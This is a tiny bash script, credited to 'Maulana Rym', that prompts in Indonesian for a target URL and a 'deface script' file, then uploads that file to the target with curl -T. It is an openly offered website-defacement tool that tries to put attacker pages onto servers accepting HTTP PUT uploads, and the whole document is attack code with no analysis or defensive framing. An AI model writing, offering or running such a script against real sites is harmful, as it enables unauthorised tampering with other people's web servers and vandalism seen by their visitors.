#!/bin/bash
#Codec By Maulana Rym

echo "Masukan Target lu : "
read target
sleep 1
echo "Input Script Deface lu : "
read file
sleep 1
echo "Please Wait..."
sleep 2
curl -T /sdcard/$file $target